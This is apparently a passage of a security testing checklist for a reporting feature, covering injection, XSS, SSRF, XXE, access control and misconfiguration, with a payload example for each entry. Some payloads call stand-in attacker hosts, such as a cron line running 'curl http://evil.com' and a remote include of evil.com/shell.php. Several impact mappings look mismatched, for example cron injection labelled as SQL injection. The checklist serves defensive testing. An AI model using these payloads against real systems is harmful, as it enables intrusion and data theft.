**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Send JSON with __proto__ 2. Pollute prototype 3. Affect application 4. Security bypass

**Expected Result:** Prototype pollution should be prevented

**Payload Example:**

```
{"__proto__":{"isAdmin":true}}
```

**Impact:** Prototype pollution -&gt; DOM XSS (client) / RCE (server).

**Tools:** Burp Suite / Postman

**References:** CWE-1321; -&gt;[Prototype Pollution checklist](#/checklist/prototype); Olivier Arteau; PortSwigger server-side PP

---

## RPT-223 — Report Second-Order Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Store payload in report 2. Trigger processing 3. Payload executes 4. Delayed injection

**Expected Result:** All data usage should be sanitized

**Payload Example:**

```
Payload stored then used in aggregation
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Manual Testing

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-224 — Report Timing Attack
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Query report data 2. Measure response time 3. Infer data existence 4. Information leakage

**Expected Result:** Response time should be consistent

**Payload Example:**

```
Timing differences for existing vs non-existing data
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## RPT-225 — Report Metadata Exposure
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. View report metadata 2. Find internal info 3. Extract system details 4. Reconnaissance

**Expected Result:** Metadata should not expose internals

**Payload Example:**

```
Creator internal ID or system paths in metadata
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## RPT-226 — Report Concurrent Access Conflict
**Test Category:** Race Condition · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Edit report from two sessions 2. Save simultaneously 3. Data corruption 4. Lost updates

**Expected Result:** Concurrent edits should be handled

**Payload Example:**

```
Parallel PUT requests to same report
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Multiple Browsers

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## RPT-227 — Report Version Control Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Access report version 2. Modify version_id 3. Access unauthorized versions 4. Historical data access

**Expected Result:** Version access should verify permissions

**Payload Example:**

```
GET /api/reports/123/versions/unauthorized
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-228 — Report Audit Log Tampering
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Access audit logs 2. Modify or delete entries 3. Cover tracks 4. Evidence destruction

**Expected Result:** Audit logs should be immutable

**Payload Example:**

```
DELETE /api/audit-logs/incriminating_entry
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-229 — Report Third-Party Integration Leak
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Report integrates third-party 2. API keys sent to third-party 3. Keys exposed 4. Account compromise

**Expected Result:** Third-party integrations should be secure

**Payload Example:**

```
API keys in third-party requests
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Network Analysis

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## RPT-230 — Report Webhook Tampering
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Set report webhook 2. Modify webhook target 3. Redirect data 4. Data exfiltration

**Expected Result:** Webhooks should be validated

**Payload Example:**

```
webhook=https://attacker.com/capture
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## RPT-231 — Report PDF Generation RCE
**Test Category:** Remote Code Execution · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Report generates PDF 2. Inject command in data 3. PDF generator executes 4. Server compromise

**Expected Result:** PDF generation should be sandboxed

**Payload Example:**

```
Command injection via PDF library
```

**Impact:** Code/command execution -&gt; full server compromise.

**Tools:** Burp Suite / Postman

**References:** CWE-94; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger; OWASP

---

## RPT-232 — Report Excel Generation XXE
**Test Category:** XML External Entity · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Report generates Excel 2. XXE in XLSX XML 3. Excel created 4. File disclosure

**Expected Result:** Excel generation should disable entities

**Payload Example:**

```
XXE in Excel XML components
```

**Impact:** XXE -&gt; local file read / SSRF / OOB exfiltration.

**Tools:** Burp Suite / XXEinjector

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE

---

## RPT-233 — Report Image Export SSRF
**Test Category:** Server-Side Request Forgery · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Export report as image 2. Include external image 3. Server fetches 4. SSRF

**Expected Result:** Image export should not fetch external URLs

**Payload Example:**

```
External image URL pointing to internal service
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## RPT-234 — Report Scheduled Task Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Schedule report 2. Inject in cron expression 3. Command injection 4. Server compromise

**Expected Result:** Cron expressions should be validated

**Payload Example:**

```
*/1 * * * * curl http://evil.com
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-235 — Report Dashboard Widget Injection
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Create dashboard widget 2. Inject XSS in config 3. Dashboard renders 4. XSS executes

**Expected Result:** Widget configs should be sanitized

**Payload Example:**

```
{"widget_title":"<script>alert(1)</script>"}
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## RPT-236 — Report Filter Persistence Attack
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Apply filters to report 2. Filters saved to URL 3. Share URL 4. Filters bypass security

**Expected Result:** Filter URLs should respect permissions

**Payload Example:**

```
Shared URL with admin-only filter
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / URL Analysis

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-237 — Report Calculated Field Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Create calculated field 2. Inject code in formula 3. Formula evaluates 4. Code execution

**Expected Result:** Calculated fields should be sandboxed

**Payload Example:**

```
formula="".constructor.constructor('return this')()"
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-238 — Report Data Binding SSTI
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Report binds data to template 2. Inject SSTI in data 3. Template renders 4. Code execution

**Expected Result:** Data should not be processed as templates

**Payload Example:**

```
Data value: {{config.SECRET_KEY}}
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite / Tplmap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## RPT-239 — Report Multi-Tenant Data Leak
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Query report in tenant A 2. Modify query 3. Access tenant B data 4. Cross-tenant breach

**Expected Result:** Reports should be strictly tenant-scoped

**Payload Example:**

```
Remove tenant_id filter from query
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## RPT-240 — Report API Key Exposure
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Inspect report requests 2. Find API key in URL/headers 3. Extract key 4. API abuse

**Expected Result:** API keys should be server-side

**Payload Example:**

```
API key in JavaScript or URL parameters
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Browser DevTools / Burp Suite

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## RPT-241 — Report Debug Mode Exposure
**Test Category:** Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Access report with debug param 2. Enable debug mode 3. View debug info 4. System exposure

**Expected Result:** Debug should be disabled in production

**Payload Example:**

```
?debug=true or ?verbose=1
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Param Discovery

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## RPT-242 — Report Open Redirect
**Test Category:** Open Redirect · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Report has redirect 2. Modify redirect URL 3. Redirect to malicious site 4. Phishing

**Expected Result:** Redirects should be validated

**Payload Example:**

```
redirect=https://evil.com/phish
```

**Impact:** Open redirect -&gt; OAuth code/token theft, credible phishing on the trusted origin.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-601; -&gt;[Open Redirect checklist](#/checklist/openredir); PortSwigger; PayloadsAllTheThings

---

## RPT-243 — Report Content Security Policy Bypass
**Test Category:** Security Misconfiguration · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Analyze CSP header 2. Find bypass 3. Execute XSS 4. Data theft

**Expected Result:** CSP should be comprehensive

**Payload Example:**

```
Exploit unsafe-inline or allowed sources
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** CSP Evaluator / Burp Suite

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## RPT-244 — Report Subdomain Takeover
**Test Category:** Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Find report CDN subdomain 2. Check for dangling DNS 3. Takeover subdomain 4. Serve malicious content

**Expected Result:** Subdomains should be properly configured

**Payload Example:**

```
analytics-cdn.company.com pointing to unclaimed service
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Subjack / Can-I-Take-Over-XYZ

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## RPT-245 — Report HTTP Request Smuggling
**Test Category:** Request Smuggling · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Test CL.TE/TE.CL 2. Smuggle request 3. Access other users' data 4. Cache poisoning

**Expected Result:** HTTP parsing should be consistent

**Payload Example:**

```
CL.TE or TE.CL payload
```

**Impact:** HTTP request smuggling -&gt; cache poisoning / auth bypass / request hijacking.

**Tools:** Burp Suite HTTP Request Smuggler

**References:** CWE-444; -&gt;[Request Smuggling checklist](#/checklist/smuggling); James Kettle HTTP Desync Attacks

---

## RPT-246 — Report Server Banner Disclosure
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Analyze response headers 2. Find server version 3. Research vulnerabilities 4. Targeted attack

**Expected Result:** Server banners should be hidden

**Payload Example:**

```
Server: Apache/2.4.49 (vulnerable version)
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / curl

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## RPT-247 — Report Cookie Security Issues
**Test Category:** Security Misconfiguration · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Analyze report cookies 2. Check security flags 3. Find vulnerable cookies 4. Session theft

**Expected Result:** Cookies should have security flags

**Payload Example:**

```
Missing Secure/HttpOnly/SameSite flags
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## RPT-248 — Report Missing Security Headers
**Test Category:** Security Misconfiguration · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Analyze response headers 2. Check for missing headers 3. Exploit missing protections 4. Various attacks

**Expected Result:** All security headers should be present

**Payload Example:**

```
Missing X-Frame-Options/CSP/HSTS/X-Content-Type-Options
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Security Headers Scanner / Burp Suite

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## RPT-249 — Report Host Header Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Modify Host header 2. Check for injection 3. Cache poisoning or password reset 4. Account takeover

**Expected Result:** Host header should be validated

**Payload Example:**

```
Host: evil.com in report request
```

**Impact:** Host-header injection into this flow -&gt; password-reset poisoning / cache poisoning -&gt; account takeover.

**Tools:** Burp Suite / curl

**References:** CWE-644; -&gt;[Host Header Injection checklist](#/checklist/hostheader); James Kettle Practical Web Cache Poisoning

---

## RPT-250 — Report User Enumeration
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Test report access 2. Compare responses 3. Enumerate valid users 4. User list exposure

**Expected Result:** Responses should be consistent

**Payload Example:**

```
Different errors for valid vs invalid users
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder / ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## RPT-251 — Report Privilege Enumeration
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Test various permissions 2. Analyze responses 3. Enumerate privilege levels 4. Attack planning

**Expected Result:** Permission errors should be generic

**Payload Example:**

```
Different errors revealing permission structure
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## RPT-252 — Report Data Retention Bypass
**Test Category:** Privacy Violation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Data has retention limit 2. Access after retention 3. View deleted data 4. Privacy breach

**Expected Result:** Retention should be enforced

**Payload Example:**

```
Access data beyond retention period
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite / Postman

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## RPT-253 — Report Backup Exposure
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Enumerate backup files 2. Find report backups 3. Download backups 4. Data breach

**Expected Result:** Backups should not be web-accessible

**Payload Example:**

```
/backups/reports.sql or /reports.json.bak
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / ffuf / dirsearch

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## RPT-254 — Report Source Code Exposure
**Test Category:** Information Disclosure · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Access report source 2. Find .git or source files 3. Download source 4. Vulnerability discovery

**Expected Result:** Source should not be accessible

**Payload Example:**

```
/.git/config or /reports.php.bak
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / GitTools / ffuf

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## RPT-255 — Report Environment Variable Leak
**Test Category:** Information Disclosure · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Trigger report error 2. Error shows env vars 3. Extract secrets 4. System compromise

**Expected Result:** Env vars should never be exposed

**Payload Example:**

```
Database credentials or API keys in error
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Error Analysis

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## RPT-256 — Report Memory Leak
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Access report with specific params 2. Response includes memory content 3. Extract secrets 4. Data exposure

**Expected Result:** Memory should be properly managed

**Payload Example:**

```
Memory dump showing sensitive data
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## RPT-257 — Report Directory Listing
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Access report directories 2. Directory listing enabled 3. Browse files 4. Sensitive file discovery

**Expected Result:** Directory listing should be disabled

**Payload Example:**

```
/reports/ showing all report files
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Browser

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## RPT-258 — Report File Inclusion
**Test Category:** Path Traversal · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Report includes file 2. Modify file parameter 3. Include system file 4. Information disclosure

**Expected Result:** File includes should be restricted

**Payload Example:**

```
?include=../../../etc/passwd
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite / DotDotPwn

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## RPT-259 — Report Remote File Inclusion
**Test Category:** Remote Code Execution · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Report includes remote file 2. Provide malicious URL 3. Include attacker's file 4. Code execution

**Expected Result:** Remote includes should be disabled

**Payload Example:**

```
?file=http://evil.com/shell.php
```

**Impact:** Code/command execution -&gt; full server compromise.

**Tools:** Burp Suite / Postman

**References:** CWE-94; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger; OWASP

---

## RPT-260 — Report XML Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Report processes XML 2. Inject XML entities 3. Modify XML structure 4. Data manipulation

**Expected Result:** XML should be properly escaped

**Payload Example:**

```
<name>test</name><admin>true</admin>
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-261 — Report JSON Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Report processes JSON 2. Inject JSON breaking chars 3. Modify JSON structure 4. Data manipulation

**Expected Result:** JSON should be properly escaped

**Payload Example:**

```
{"name":"value",admin:"true"}
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-262 — Report HTTP Method Override
**Test Category:** Security Bypass · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. POST endpoint protected 2. Use method override 3. Access via GET 4. Bypass protection

**Expected Result:** Method override should be disabled

**Payload Example:**

```
X-HTTP-Method-Override: DELETE or ?_method=DELETE
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / curl

**References:** CWE-840; PortSwigger Business logic

---

## RPT-263 — Report API Version Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Reporting Security

**Test Steps:** 1. Current API has security 2. Use old API version 3. Bypass new security 4. Exploit vulnerability

**Expected Result:** All API versions should be secured

**Payload Example:**

```
/api/v1/reports bypassing v2 auth
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---
